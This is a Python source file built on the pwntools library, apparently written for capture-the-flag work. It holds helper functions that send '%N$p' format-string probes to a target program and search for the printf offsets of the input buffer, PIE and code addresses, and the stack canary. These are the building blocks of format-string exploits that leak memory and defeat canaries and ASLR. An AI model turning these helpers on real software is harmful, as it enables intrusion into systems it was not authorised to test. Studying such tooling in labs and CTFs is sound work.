from pwn import *
from re import findall
r_init = None
PWNSCRIPT_PRINTF_MAX = 35
pack = {'i386': p32, 'amd64': p64}
def extract_all_hex(s: bytes) -> list:
    try: return list(map(lambda l: int(l,16), findall(b'0x[0-9a-f]+', s)))
    except IndexError: return []
def extract_first_hex(s: bytes) -> int:
    try: return int(findall(b'0x[0-9a-z]+', s)[0],16)
    except IndexError: return -1
def is_PIE_address(v: int) -> bool:
    return v > 0 and findall('0x55.*' if context.arch == 'amd64' else '0x56.*', hex(v)) != []
def _find_printf_offset_extractor(requirement):
    def inner(extractor, offset):
        for i in range(1,PWNSCRIPT_PRINTF_MAX):
            v = extractor(i)
            if requirement(v, offset): return i
        raise RuntimeError
    return inner
def _find_printf_offset_sendprintf(requirement):
    def inner(sendprintf) -> int:
        for i in range(1,PWNSCRIPT_PRINTF_MAX): #note that we're not handling unaligned printf
            v = extract_first_hex(sendprintf('A'*8 + '%{}$p\n'.format(i)))
            if v == -1: continue
            if requirement(v): return i
        raise RuntimeError
    return inner
@_find_printf_offset_extractor
def find_printf_offset_PIE(v, pie_offset) -> int: #or None
    '''loop to find printf offset of a PIE address'''
    return is_PIE_address(v) and (v-pie_offset) % 0x100 == 0
@_find_printf_offset_extractor
def find_printf_offset_lsmr(v, lsmr_offset) -> int: #or None
    return v > 0 and (v-lsmr_offset) % 0x100 == 0
@_find_printf_offset_sendprintf
def find_printf_offset_buffer(resp) -> int:
    expected = (0x41414141 if context.arch == 'i386' else 0x4141414141414141)
    return expected == resp
@_find_printf_offset_sendprintf
def find_printf_offset_code(resp) -> int:
    return findall({'i386': '0x804...', 'amd64': '0x40....'}[context.arch], hex(resp)) != []
@_find_printf_offset_sendprintf
def find_printf_offset_canary(resp) -> int:
    '''heuristic to find canary'''
    return resp % 0x100 == 0 and b'\x00' not in pack[context.arch](resp)[1:] and (context.arch == 'amd64' or (lambda b: b < 0xf0 and b != 0x08)(pack[context.arch](resp)[3]))
